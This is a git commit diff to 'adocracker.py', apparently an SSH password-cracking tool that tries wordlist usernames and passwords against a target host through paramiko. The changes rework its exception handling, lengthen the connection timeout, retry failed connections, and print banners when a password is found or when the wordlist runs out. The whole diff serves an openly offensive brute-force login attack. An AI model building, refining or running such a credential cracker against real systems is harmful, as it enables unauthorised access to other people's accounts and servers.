cb61a94cb325a5563589898f05a412b7d8ff6336
Ado <43269396+adomigold@users.noreply.github.com>
2021-01-15 05:47:00 -0800

    Update adocracker.py

--- adocracker.py
+++ adocracker.py
@@ -178,24 +178,35 @@ if args.service == "ssh":
                     ssh = paramiko.SSHClient()
                     ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                     try:
-                        ssh.connect(target, port, user, password, timeout=5)
+                        ssh.connect(target, port, user, password, timeout=600)
                     except socket.timeout:
                         print(f"[!] Host: {target} is unreachable")
                         return False
                     except paramiko.AuthenticationException:
                         if args.verbose in sys.argv:
                             if args.verbose != "show":
-                                sys.exit(1)
+                                return False
                             print('\033[1;37m''[+]', user, '_', password)
                         return False
-                    except paramiko.SSHException:
-                        print(f"[*] Connection timeout, The script will restart connection in delay...")
+                    except paramiko.ssh_exception.NoValidConnectionsError :
+                        print(f"\033[1;33m[*] Connection timeout, The script will restart connection in delay... Press CTRL+c to cancel")
                         time.sleep(10)
                         return open_ssh(target, port, user, password)
+                    except paramiko.ssh_exception.SSHException:
+                        print("\033[1;31mConnection was aborted by the software in your host machine... And we don't know why")
+                        exit(0)
                     else:
-                        print(f"Password found : {password}")
+                        print("\n\033[1;92m-----------------------------------------"
+                              "\n Password found:", password,
+                              "\n------------------------------------------")
                         exit(0)
                 open_ssh(target, port, user, password)
     except KeyboardInterrupt:
         print("\n\033[1;31m[*] CTRL+c detected... Exiting now")
+        exit(0)
+    else:
+        print("------------------------------------------------------------------"
+              "\n Sorry No password or username found on your wordlist"
+              "\n Please provide wordlist with more words to increase your chance"
+              "\n----------------------------------------------------------------")
         exit(0)
